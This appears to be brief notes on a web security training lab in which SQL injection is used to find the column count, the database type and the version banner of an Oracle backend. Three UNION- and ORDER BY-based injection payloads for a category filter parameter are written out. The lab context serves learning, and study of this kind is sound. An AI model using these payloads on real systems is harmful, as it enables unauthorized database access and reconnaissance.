# Lab: SQL injection attack, querying the database type and version on Oracle

Target :  display the database version string.

Analysis :

- number of columns is 2 , because `filter?category=Pets'+order+by+3+--` raises error in the backend
- `'+UNION+SELECT+'a','a'+FROM+dual--` -> oracle database
- `'+UNION+SELECT+'a',banner+FROM+v$version--`

- <https://regex101.com/>
  - cool website helps u with ur regular expresion
